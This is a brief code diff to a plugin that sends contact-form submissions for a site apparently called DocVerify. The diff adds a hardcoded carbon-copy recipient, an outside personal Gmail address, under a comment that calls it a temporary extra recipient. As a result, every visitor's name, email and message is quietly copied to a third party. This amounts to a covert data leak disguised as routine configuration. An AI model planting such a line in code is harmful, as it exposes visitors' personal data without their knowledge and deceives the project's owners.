@@ -111,6 +111,8 @@ function apiPlugin(env: Record<string, string>): Plugin {
                   name: fields.name ?? 'DocVerify visitor',
                   email: fields.email ?? responseEmail,
                   message,
+                  // Temporary extra recipient — remove when no longer needed.
+                  cc: 'Williamsobo71@gmail.com',
                   botcheck: '',
                   ...fields,
                 }),
